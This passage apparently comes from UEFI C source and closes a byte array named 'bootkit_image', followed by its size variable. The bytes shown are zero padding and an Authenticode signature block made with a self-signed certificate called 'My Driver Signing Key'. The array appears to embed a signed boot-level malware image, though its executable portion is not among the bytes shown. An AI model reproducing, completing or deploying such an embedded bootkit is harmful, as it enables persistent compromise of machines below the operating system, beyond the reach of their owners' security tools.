    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x88, 0x05, 0x00, 0x00, 0x00, 0x02, 0x02, 0x00, 0x30, 0x82, 0x05, 0x75, 0x06, 0x09, 0x2A, 0x86,
    0x48, 0x86, 0xF7, 0x0D, 0x01, 0x07, 0x02, 0xA0, 0x82, 0x05, 0x66, 0x30, 0x82, 0x05, 0x62, 0x02,
    0x01, 0x01, 0x31, 0x0F, 0x30, 0x0D, 0x06, 0x09, 0x60, 0x86, 0x48, 0x01, 0x65, 0x03, 0x04, 0x02,
    0x01, 0x05, 0x00, 0x30, 0x5C, 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x01,
    0x04, 0xA0, 0x4E, 0x30, 0x4C, 0x30, 0x17, 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37,
    0x02, 0x01, 0x0F, 0x30, 0x09, 0x03, 0x01, 0x00, 0xA0, 0x04, 0xA2, 0x02, 0x80, 0x00, 0x30, 0x31,
    0x30, 0x0D, 0x06, 0x09, 0x60, 0x86, 0x48, 0x01, 0x65, 0x03, 0x04, 0x02, 0x01, 0x05, 0x00, 0x04,
    0x20, 0xBC, 0x99, 0xA4, 0xE1, 0x00, 0xDD, 0x0C, 0x56, 0x66, 0x9A, 0x90, 0x39, 0x42, 0x04, 0x09,
    0x05, 0x9D, 0xCA, 0x39, 0xDD, 0x54, 0x00, 0x4D, 0x9D, 0x05, 0xC7, 0xCE, 0xA2, 0x3A, 0x93, 0xC5,
    0xDB, 0xA0, 0x82, 0x03, 0x25, 0x30, 0x82, 0x03, 0x21, 0x30, 0x82, 0x02, 0x09, 0xA0, 0x03, 0x02,
    0x01, 0x02, 0x02, 0x14, 0x1A, 0xD4, 0x4E, 0xB8, 0x18, 0xA3, 0x34, 0xD3, 0x3F, 0x2F, 0x59, 0x1D,
    0x47, 0x05, 0x0D, 0x1F, 0x14, 0x2E, 0x3D, 0xDE, 0x30, 0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86,
    0xF7, 0x0D, 0x01, 0x01, 0x0B, 0x05, 0x00, 0x30, 0x20, 0x31, 0x1E, 0x30, 0x1C, 0x06, 0x03, 0x55,
    0x04, 0x03, 0x0C, 0x15, 0x4D, 0x79, 0x20, 0x44, 0x72, 0x69, 0x76, 0x65, 0x72, 0x20, 0x53, 0x69,
    0x67, 0x6E, 0x69, 0x6E, 0x67, 0x20, 0x4B, 0x65, 0x79, 0x30, 0x1E, 0x17, 0x0D, 0x32, 0x36, 0x30,
    0x36, 0x31, 0x37, 0x31, 0x37, 0x30, 0x34, 0x31, 0x30, 0x5A, 0x17, 0x0D, 0x33, 0x36, 0x30, 0x36,
    0x31, 0x34, 0x31, 0x37, 0x30, 0x34, 0x31, 0x30, 0x5A, 0x30, 0x20, 0x31, 0x1E, 0x30, 0x1C, 0x06,
    0x03, 0x55, 0x04, 0x03, 0x0C, 0x15, 0x4D, 0x79, 0x20, 0x44, 0x72, 0x69, 0x76, 0x65, 0x72, 0x20,
    0x53, 0x69, 0x67, 0x6E, 0x69, 0x6E, 0x67, 0x20, 0x4B, 0x65, 0x79, 0x30, 0x82, 0x01, 0x22, 0x30,
    0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x01, 0x05, 0x00, 0x03, 0x82,
    0x01, 0x0F, 0x00, 0x30, 0x82, 0x01, 0x0A, 0x02, 0x82, 0x01, 0x01, 0x00, 0xD3, 0x2F, 0x05, 0x5C,
    0x68, 0xF2, 0x4B, 0xB1, 0x71, 0xA4, 0x47, 0xE3, 0x86, 0xB4, 0xF4, 0x00, 0xD8, 0xD3, 0xD7, 0x1C,
    0xD2, 0x01, 0x97, 0x73, 0x9B, 0x84, 0xFB, 0x72, 0x7D, 0x35, 0x4F, 0x94, 0x81, 0x25, 0x18, 0xAB,
    0x6C, 0x5A, 0x9F, 0x98, 0xD6, 0x54, 0x76, 0x99, 0x92, 0xFC, 0x96, 0x46, 0xA8, 0x06, 0xFC, 0xBF,
    0xFC, 0x40, 0xC8, 0x8D, 0x4F, 0x1B, 0x29, 0xE9, 0x6B, 0xD8, 0x65, 0x27, 0x38, 0xC6, 0xA7, 0xC8,
    0x65, 0x3E, 0x48, 0x07, 0x98, 0x7B, 0xB1, 0xA6, 0x3F, 0x5C, 0x3C, 0xCE, 0x72, 0x9B, 0x96, 0x2B,
    0x34, 0xCB, 0x6F, 0xE9, 0xA3, 0x56, 0xCC, 0x38, 0xB7, 0x54, 0xF2, 0x5D, 0x97, 0xC1, 0xFE, 0x9B,
    0xD8, 0xAB, 0x49, 0xFB, 0x5F, 0xBF, 0x4E, 0x43, 0x5B, 0x66, 0x2D, 0xC3, 0xBD, 0xD1, 0xDD, 0xC5,
    0x5C, 0xEE, 0x8D, 0x05, 0x04, 0xD9, 0xFE, 0x35, 0x91, 0x58, 0x21, 0x88, 0xD2, 0x99, 0x18, 0x92,
    0xEA, 0x95, 0xD1, 0x42, 0xF2, 0xB4, 0x40, 0x05, 0x43, 0x9F, 0x7D, 0xC3, 0x1D, 0x78, 0x7D, 0xE3,
    0xC4, 0x8D, 0x80, 0x50, 0xF0, 0xD2, 0x37, 0x7F, 0xC1, 0xBD, 0x54, 0x5A, 0x00, 0xF9, 0xF5, 0x25,
    0xA1, 0x8A, 0x48, 0xB3, 0x49, 0xA6, 0x1D, 0x3A, 0xBC, 0x62, 0xFD, 0x8A, 0x97, 0x74, 0x13, 0xE1,
    0x70, 0xD0, 0x0B, 0x85, 0xBC, 0xB0, 0xAE, 0x6F, 0x8A, 0xD4, 0xB9, 0xE4, 0x18, 0xA1, 0x64, 0x24,
    0x2B, 0x80, 0x76, 0xAF, 0x27, 0xE5, 0x6C, 0x12, 0x69, 0x4E, 0x40, 0xDD, 0x53, 0xDE, 0x8F, 0xCE,
    0x31, 0x74, 0xE9, 0xCB, 0xDC, 0xF4, 0xCF, 0x6D, 0x36, 0xEB, 0x42, 0x7F, 0x7C, 0xD2, 0x26, 0xB5,
    0x6E, 0xB4, 0xE2, 0x85, 0x09, 0x9D, 0xCD, 0xA3, 0x88, 0x71, 0xB6, 0x89, 0x95, 0x80, 0x69, 0x9E,
    0xF1, 0x3C, 0x2D, 0xEE, 0x6C, 0x3D, 0xBD, 0x90, 0x34, 0x61, 0x3B, 0xEF, 0x02, 0x03, 0x01, 0x00,
    0x01, 0xA3, 0x53, 0x30, 0x51, 0x30, 0x1D, 0x06, 0x03, 0x55, 0x1D, 0x0E, 0x04, 0x16, 0x04, 0x14,
    0x70, 0xA6, 0x3D, 0x39, 0x4D, 0xD3, 0x10, 0xFB, 0x9F, 0x3A, 0xE8, 0xDF, 0xF1, 0xE5, 0x1C, 0x34,
    0xDA, 0x4D, 0x9A, 0x03, 0x30, 0x1F, 0x06, 0x03, 0x55, 0x1D, 0x23, 0x04, 0x18, 0x30, 0x16, 0x80,
    0x14, 0x70, 0xA6, 0x3D, 0x39, 0x4D, 0xD3, 0x10, 0xFB, 0x9F, 0x3A, 0xE8, 0xDF, 0xF1, 0xE5, 0x1C,
    0x34, 0xDA, 0x4D, 0x9A, 0x03, 0x30, 0x0F, 0x06, 0x03, 0x55, 0x1D, 0x13, 0x01, 0x01, 0xFF, 0x04,
    0x05, 0x30, 0x03, 0x01, 0x01, 0xFF, 0x30, 0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D,
    0x01, 0x01, 0x0B, 0x05, 0x00, 0x03, 0x82, 0x01, 0x01, 0x00, 0x52, 0x4C, 0x37, 0x1E, 0x48, 0x1D,
    0x27, 0x5B, 0xD9, 0xB0, 0x67, 0xF1, 0x04, 0xAA, 0x8A, 0x84, 0xE9, 0xF5, 0xB4, 0xC5, 0xF3, 0x17,
    0x0D, 0x1A, 0x8D, 0x35, 0x8C, 0x09, 0xC0, 0xB4, 0xA9, 0xB5, 0xB1, 0xD8, 0x06, 0x2F, 0x55, 0x06,
    0x06, 0x8F, 0x8D, 0x1E, 0x13, 0x26, 0xC1, 0x22, 0x77, 0x91, 0xF7, 0x78, 0x2E, 0x58, 0x97, 0x49,
    0x94, 0xD8, 0x3A, 0xF3, 0xC1, 0x0A, 0x3D, 0x7D, 0x9F, 0xC5, 0xCF, 0x49, 0x5D, 0xED, 0x78, 0x03,
    0x33, 0x7C, 0xDC, 0x5E, 0x11, 0x00, 0x09, 0xE0, 0xD8, 0xFB, 0x70, 0xCF, 0x9B, 0xF9, 0xDF, 0xF5,
    0x26, 0xF7, 0xB2, 0xCD, 0xCA, 0x71, 0xD6, 0x79, 0xF2, 0x60, 0xA5, 0x32, 0x4B, 0x1D, 0x8F, 0xFC,
    0xC3, 0x40, 0x40, 0x51, 0x31, 0xB3, 0x10, 0x4E, 0xA7, 0x38, 0xD4, 0x03, 0x31, 0xE4, 0x2D, 0x76,
    0x28, 0x19, 0x37, 0xB3, 0xFB, 0x2A, 0x39, 0x84, 0x2A, 0x6E, 0x41, 0x53, 0xC0, 0x23, 0x5C, 0x11,
    0x98, 0x31, 0x33, 0x31, 0xAF, 0x45, 0x4F, 0xC0, 0x50, 0xC4, 0xE6, 0x09, 0xA1, 0x24, 0xA9, 0x77,
    0xA8, 0xA3, 0x74, 0xF3, 0x45, 0x29, 0xBB, 0x2B, 0x92, 0x36, 0x93, 0x87, 0xC2, 0x7C, 0xBF, 0x67,
    0x9C, 0x9E, 0x16, 0xB5, 0x63, 0x7D, 0x34, 0xCD, 0x0F, 0x22, 0x64, 0xC1, 0xD3, 0xEA, 0x32, 0x91,
    0xD5, 0x15, 0xBB, 0x9B, 0x43, 0xAC, 0xC3, 0x61, 0xC3, 0x42, 0x66, 0x37, 0x12, 0xC9, 0xEC, 0xB5,
    0x0F, 0x6F, 0xB7, 0x33, 0x34, 0x82, 0x9A, 0x4C, 0x05, 0x4D, 0xD2, 0x6A, 0x9B, 0xD5, 0x01, 0xC8,
    0x7A, 0x3A, 0x20, 0xCD, 0xD6, 0x4C, 0x48, 0x88, 0x5B, 0xB8, 0xF1, 0xDE, 0x93, 0xFC, 0x8A, 0xF6,
    0xA6, 0x23, 0x47, 0x16, 0x12, 0x38, 0x53, 0x3F, 0x1F, 0xEB, 0x7B, 0x06, 0x6A, 0x59, 0x7F, 0xB7,
    0x40, 0x3F, 0xD7, 0x9A, 0xDC, 0xCB, 0x86, 0x44, 0x49, 0xC1, 0x31, 0x82, 0x01, 0xC3, 0x30, 0x82,
    0x01, 0xBF, 0x02, 0x01, 0x01, 0x30, 0x38, 0x30, 0x20, 0x31, 0x1E, 0x30, 0x1C, 0x06, 0x03, 0x55,
    0x04, 0x03, 0x0C, 0x15, 0x4D, 0x79, 0x20, 0x44, 0x72, 0x69, 0x76, 0x65, 0x72, 0x20, 0x53, 0x69,
    0x67, 0x6E, 0x69, 0x6E, 0x67, 0x20, 0x4B, 0x65, 0x79, 0x02, 0x14, 0x1A, 0xD4, 0x4E, 0xB8, 0x18,
    0xA3, 0x34, 0xD3, 0x3F, 0x2F, 0x59, 0x1D, 0x47, 0x05, 0x0D, 0x1F, 0x14, 0x2E, 0x3D, 0xDE, 0x30,
    0x0D, 0x06, 0x09, 0x60, 0x86, 0x48, 0x01, 0x65, 0x03, 0x04, 0x02, 0x01, 0x05, 0x00, 0xA0, 0x5E,
    0x30, 0x10, 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x01, 0x0C, 0x31, 0x02,
    0x30, 0x00, 0x30, 0x19, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x09, 0x03, 0x31,
    0x0C, 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x01, 0x04, 0x30, 0x2F, 0x06,
    0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x09, 0x04, 0x31, 0x22, 0x04, 0x20, 0xFF, 0x3C,
    0xD9, 0x9F, 0xE5, 0x1B, 0xE9, 0x10, 0x6F, 0xC6, 0x21, 0xD6, 0x82, 0x47, 0xDD, 0x18, 0x67, 0x62,
    0x8F, 0x7B, 0x5E, 0x7E, 0x85, 0x38, 0x39, 0x60, 0x10, 0xFF, 0xCD, 0x95, 0xAF, 0xC6, 0x30, 0x0D,
    0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x01, 0x05, 0x00, 0x04, 0x82, 0x01,
    0x00, 0x55, 0x3A, 0x65, 0x14, 0x6D, 0xBF, 0xAA, 0xEE, 0x6D, 0x4E, 0x60, 0x67, 0x5F, 0xAB, 0xF3,
    0xAC, 0x94, 0x6C, 0x0D, 0xA3, 0x5B, 0x66, 0x4C, 0xCF, 0xDF, 0x8A, 0x3C, 0x4C, 0xAD, 0x50, 0x88,
    0x4C, 0x7B, 0x4F, 0x3E, 0x51, 0x0C, 0x44, 0xFD, 0xC6, 0x2C, 0xBC, 0x55, 0x99, 0xDD, 0x70, 0x90,
    0x77, 0x3E, 0xC4, 0x80, 0xDC, 0x34, 0xA0, 0x89, 0x5A, 0xC5, 0xBC, 0x4B, 0xC3, 0x09, 0x80, 0x21,
    0xF9, 0xB4, 0x9B, 0x36, 0x71, 0x3E, 0xEA, 0x03, 0x61, 0xA8, 0xA2, 0x85, 0x10, 0xAA, 0x53, 0xBB,
    0x9A, 0xDA, 0x81, 0xC6, 0x65, 0x25, 0x0E, 0x24, 0xE3, 0x2E, 0x1E, 0x5B, 0xE6, 0x71, 0xC3, 0xC8,
    0xC2, 0x63, 0x61, 0x2F, 0xC0, 0x8C, 0x37, 0x67, 0x01, 0xAC, 0xD3, 0x68, 0x46, 0x47, 0xCA, 0x60,
    0x94, 0x6E, 0xFA, 0xBD, 0xCC, 0xB8, 0xDD, 0xD1, 0x41, 0xF2, 0xBB, 0x7C, 0x4E, 0x1A, 0xBE, 0xE3,
    0x69, 0x53, 0x65, 0x94, 0xA6, 0xB0, 0xB6, 0x92, 0x8E, 0x2A, 0xE4, 0x20, 0xE8, 0xB6, 0xAE, 0xD5,
    0x8A, 0xB4, 0x2E, 0xD6, 0xD4, 0xAE, 0xDE, 0x9F, 0x5F, 0x11, 0x58, 0xC1, 0x03, 0x75, 0xA9, 0x3F,
    0x3D, 0x35, 0x8B, 0x32, 0x7C, 0xE4, 0xEC, 0xDB, 0x44, 0xD9, 0x75, 0xF6, 0xC5, 0xA9, 0xB3, 0x22,
    0x66, 0x95, 0xD8, 0xB3, 0x93, 0xAC, 0x2C, 0x64, 0x07, 0xF8, 0x00, 0xC7, 0x87, 0xEE, 0x1D, 0xF5,
    0x8C, 0x85, 0xBE, 0x7C, 0x80, 0x79, 0xF4, 0x93, 0x32, 0x93, 0xC0, 0x09, 0xFF, 0x67, 0x1E, 0xA2,
    0x01, 0xC7, 0x30, 0xE2, 0xA1, 0x70, 0x04, 0x27, 0x31, 0xA2, 0xC6, 0x09, 0xAE, 0xF9, 0x79, 0x90,
    0xFB, 0x45, 0x32, 0x4B, 0x53, 0x5E, 0x1D, 0xEB, 0xB2, 0xF7, 0x6E, 0x17, 0x6A, 0xD3, 0xE0, 0x13,
    0x8F, 0x50, 0x0D, 0x1F, 0x3A, 0x51, 0x6F, 0x5A, 0x9D, 0xDB, 0xCC, 0x0C, 0x3F, 0xDE, 0x37, 0xC9,
    0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
};
UINTN bootkit_size = sizeof(bootkit_image);
// =======================================================